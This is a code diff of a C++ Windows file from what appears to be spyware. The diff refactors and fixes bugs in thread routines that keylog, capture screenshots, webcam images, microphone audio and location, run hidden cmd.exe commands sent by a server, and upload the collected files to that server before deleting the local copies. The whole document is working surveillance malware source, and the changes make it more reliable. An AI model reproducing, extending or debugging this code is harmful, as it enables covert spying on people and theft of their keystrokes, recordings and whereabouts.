@@ -1,22 +1,20 @@
 #include "TaskRoutines.h"
-#include <mutex>
 
 HANDLE camRequest, micRequest, lockRequest, cmdRequest, locationRequest, screenRequest, newDataEvent;
 map<string, BOOL> workingTasks;
 
-std::mutex buff_mutex;
 
 DWORD WINAPI initFiltering(LPVOID lpParam)
 {
-//	snitchServer();
-	return 0;
+//	setFilters();
+	return 0; 
 }
 DWORD WINAPI initKeylogger(LPVOID lpParam)
 {
 	while (TRUE) { 
 		QUERY_USER_NOTIFICATION_STATE pquns;
 		SHQueryUserNotificationState(&pquns);
-
+		  
 		// Determine a fullscreen state
 		if (pquns == QUNS_BUSY || pquns == QUNS_RUNNING_D3D_FULL_SCREEN) 
 		{
@@ -37,13 +35,11 @@ DWORD WINAPI initKeylogger(LPVOID lpParam)
 		wstring finalFilenameW = stringToWString(finalFilename);
 		string path = DATA_FOLDER_PATH;
 
-		int res = -1;
-		do 
-			res = rename(path.append(filename).c_str(), path.append(finalFilename).c_str());
-		while (res != 0);
-
-		// Notifiy data manager thread
-		SetEvent(newDataEvent);
+		if (!rename(path.append(filename).c_str(), path.append(finalFilename).c_str()))
+		{
+			// Notifiy data manager thread
+			SetEvent(newDataEvent);
+		}
 	}
 	return 0;
 }
@@ -59,12 +55,16 @@ DWORD WINAPI initScreenshot(LPVOID lpParam)
 		ResetEvent(screenRequest);
 		// Request Arrived..
 		// Read screenshots request from disk
-		wstring filename = stringToWString(constructFilename(SCREENSHOT_CODE));
+		wstring filename = stringToWString(constructFilename(UNDEFINED_CODE));
 		// Start capturing
 		screenCapture(0, 0, 1920, 1080, filename.c_str());
-		// Notifiy data manager thread
-		SetEvent(newDataEvent);
-		return 1;
+
+		wstring filenameFinal = stringToWString(constructFilename(SCREENSHOT_CODE));
+		if (!rename(wStringToString(filename).c_str(), wStringToString(filenameFinal).c_str()))
+		{
+			// Notifiy data manager thread
+			SetEvent(newDataEvent);
+		}
 	}
 	return 0;
 }
@@ -81,11 +81,16 @@ DWORD WINAPI initCamera(LPVOID lpParam)
 		// Request Arrived..
 		// Read camera request from disk
 
-		string filename = constructFilename(CAMERA_CODE);
+		string filename = constructFilename(UNDEFINED_CODE).append(".png");
 		// Take a picture
 		camera(filename.c_str());
-		// Notifiy data manager thread
-		SetEvent(newDataEvent);
+		string filenameFinal = constructFilename(CAMERA_CODE);
+
+		if (!rename(filename.c_str(), filenameFinal.c_str()))
+		{
+			// Notifiy data manager thread
+			SetEvent(newDataEvent);
+		}
 	}
 	return 0;
 }
@@ -102,11 +107,16 @@ DWORD WINAPI initMic(LPVOID lpParam)
 		// Request Arrived..
 		// Read mic request from disk
 		
-		string filename = constructFilename(AUDIO_CODE);
+		string filename = constructFilename(UNDEFINED_CODE);
 		// Record for 10 seconds
 		recordAudio(10, filename.c_str()); 
-		// Notifiy data manager thread
-		SetEvent(newDataEvent);
+		string filenameFinal = constructFilename(AUDIO_CODE);
+
+		if (!rename(filename.c_str(), filenameFinal.c_str()))
+		{
+			// Notifiy data manager thread
+			SetEvent(newDataEvent);
+		}
 	}
 	return 0;
 }
@@ -149,15 +159,19 @@ DWORD WINAPI initRemoteCommands(LPVOID lpParam)
 		LPCWSTR o_cmd = L" > ";
 
 		// Get a new filename
-		wstring filename = stringToWString(constructFilename(CMD_CODE));
+		wstring filename = stringToWString(constructFilename(UNDEFINED_CODE));
 		
 		// Construct the full command
 		wstring stdResult = wstring(cmd) + o_cmd + filename; 
 		LPCWSTR final_cmd = stdResult.c_str();
 		ShellExecute(0, L"open", L"cmd.exe", final_cmd, 0, SW_HIDE);
 
-		// Notifiy data manager thread
-		SetEvent(newDataEvent);
+		wstring filenameFinal = stringToWString(constructFilename(CMD_CODE));
+		if (!rename(wStringToString(filename).c_str(), wStringToString(filenameFinal).c_str()))
+		{
+			// Notifiy data manager thread
+			SetEvent(newDataEvent);
+		}
 	}
 	return 0;
 }
@@ -173,10 +187,14 @@ DWORD WINAPI initLocationTracker(LPVOID lpParam) {
 			INFINITE);    // indefinite wait
 		ResetEvent(locationRequest);
 
-		wstring filename = stringToWString(constructFilename(LOCATION_CODE));
-
+		wstring filename = stringToWString(constructFilename(UNDEFINED_CODE));
 		getLocation(filename.c_str());
-		SetEvent(newDataEvent);
+		wstring filenameFinal = stringToWString(constructFilename(LOCATION_CODE));
+
+		if (!rename(wStringToString(filename).c_str(), wStringToString(filenameFinal).c_str()))
+		{
+			SetEvent(newDataEvent);
+		}
 	}
 	return 0;
 }
@@ -208,34 +226,32 @@ DWORD WINAPI initDataManager(LPVOID lpParam)
 			currentData = uploadQueue.top();
 			char filename[256];
 			// Convert wchar* to char*
-			wstring ws(data.cFileName);
+			wstring ws(currentData.cFileName);
 			wcstombs(filename, ws.c_str(), 256);
 
 			// Create json data corresponding to the current file
 
 			string dataType = checkDataType(filename);
-			if (dataType == UNDEFINED_CODE)
+			if (dataType == UNDEFINED_CODE) {
+				uploadQueue.pop();
 				continue; // File not recognized
-
+			}
 			map<string, string> currentJsonItem{
-				  make_pair("dataType", dataType)
+				  make_pair("dataType", dataType) 
 			};
 			string json = jsonFromItem(currentJsonItem, DATA);
 
-			buff_mutex.lock();
 			while (uploadFile(filename, (char*)json.c_str()).dwStatusCode != 200) {
-				buff_mutex.unlock();
 				Sleep(SYNC_TIME);
 			}
 
 			// Remove the file from temp folder after successfully uploading it	  
-			wstring wfilename(data.cFileName);
+			wstring wfilename(currentData.cFileName);
 			wstring concatted_stdstr = L"temp/" + wfilename;
 			LPCWSTR fullPath = concatted_stdstr.c_str();
 			
 			if (workingTasks.find(dataType) != workingTasks.end())
 				workingTasks.erase(dataType);
-			buff_mutex.unlock();
 
 			DeleteFile(fullPath);
 			// Remove from the queue
@@ -251,11 +267,11 @@ DWORD WINAPI initRequestManager(LPVOID lpParam)
 	// Signal event for current request. E.g. camera
 	 
 	while (TRUE) {
-		// Look for new requests from server..
+		// Look for new requests from server.. 
 		ResponseData requests; 
-		buff_mutex.lock();
+		
 		while (TRUE) {
-			requests = downloadFile();
+			requests = downloadFile(REQUESTS);
 			if (requests.dwStatusCode != 200 || requests.response == "[]")
 				Sleep(SYNC_TIME);
 			else
@@ -274,7 +290,6 @@ DWORD WINAPI initRequestManager(LPVOID lpParam)
 			initRequest(allRequests, Command, cmdRequest);
 			initRequest(allRequests, Location, locationRequest);
 		}
-		buff_mutex.unlock();
 		Sleep(SYNC_TIME);
 	}
 	return 0;
@@ -285,23 +300,28 @@ BOOL initRequest(map<string, map<string, string>> allRequests, const char* reque
 	map<string, string> currentRequest;
 	map<string, string>::iterator requestIterator;
 
+	// Check if the request name exist in the database
 	allRequestsIterator = allRequests.find(requestName);
-	if (allRequestsIterator == allRequests.end())
+	
+	// If it doesn't, return..
+	if (allRequestsIterator == allRequests.end()) 
 		return FALSE;
 
+	// Get the json data of the current request
 	currentRequest = allRequestsIterator->second;
-	requestIterator = currentRequest.find(DATA_TYPE);
 
+	// Try to find the task in the workingTasks list
 	map<string, BOOL>::iterator tasksIter = workingTasks.find(requestName);
+
 	if (tasksIter == workingTasks.end()) {
-		//If the task is new, register it in the map ..
-		workingTasks.insert(make_pair(requestIterator->second, TRUE));
+		//The task is new, register it in the map ..
+		workingTasks.insert(make_pair(requestName, TRUE));
 	}
 	else { // The task was found in the map ..
 		return FALSE; // Task already running, no need to call it again ..
 	}
 	// else call the requested task 
-	if (requestHandle != NULL && requestIterator != currentRequest.end())
+	if (requestHandle != NULL)
 	{	
 		SetEvent(requestHandle);
 		return TRUE; 
@@ -358,4 +378,10 @@ string constructFilename(const char* typeCode) {
 
 wstring stringToWString(string str) {
 	return wstring(str.begin(), str.end());
+}
+
+string wStringToString(wstring wstr) {
+	using convert_typeX = std::codecvt_utf8<wchar_t>;
+	std::wstring_convert<convert_typeX, wchar_t> converterX;
+	return converterX.to_bytes(wstr);
 }
